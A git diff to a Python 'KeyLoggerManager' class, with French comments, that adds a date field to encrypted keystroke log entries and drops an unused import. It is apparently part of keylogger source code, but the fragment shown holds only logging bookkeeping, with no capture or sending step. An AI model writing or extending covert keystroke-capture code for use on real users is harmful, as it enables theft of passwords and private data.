@@ -1,4 +1,3 @@
-import os
 import socket
 from datetime import datetime
 import time
@@ -39,12 +38,18 @@ class KeyLoggerManager:
         logged_keys = "".join(self.service.get_logged_keys())
         if logged_keys == "":
             return
+
         encrypted_data = self.encryptor.encrypt(logged_keys)
         timestamp = datetime.now().strftime("%H:%M:%S")
+        datestamp = datetime.now().strftime("%Y-%m-%d")  # Ajout de la date
 
         if encrypted_data:
-            log_entry = {"timestamp": timestamp, "key_data": encrypted_data}
-            self.entries_list.append(log_entry)  # Add to persistent list
+            log_entry = {
+                "timestamp": timestamp,
+                "datestamp": datestamp,  # 🔹 Ajout de la date
+                "key_data": encrypted_data
+            }
+            self.entries_list.append(log_entry)
             print(f"Added {len(logged_keys)} keys to the list.")
 
         self.service.clear_data()
